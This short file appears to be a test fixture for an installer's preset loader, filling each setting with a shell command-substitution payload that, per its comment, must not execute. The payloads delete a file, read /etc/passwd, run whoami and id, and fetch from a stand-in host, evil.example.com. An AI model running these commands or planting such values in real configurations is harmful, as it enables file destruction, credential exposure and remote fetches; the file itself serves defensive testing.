# Malicious preset — values contain command substitution that must NOT execute
DISK="$(rm /tmp/canary)"
HOSTNAME="$(whoami)"
USERNAME="$(id)"
TIMEZONE="$(cat /etc/passwd)"
LOCALE="$(touch /tmp/pwned)"
REFLECTOR_COUNTRY="$(curl http://evil.example.com)"
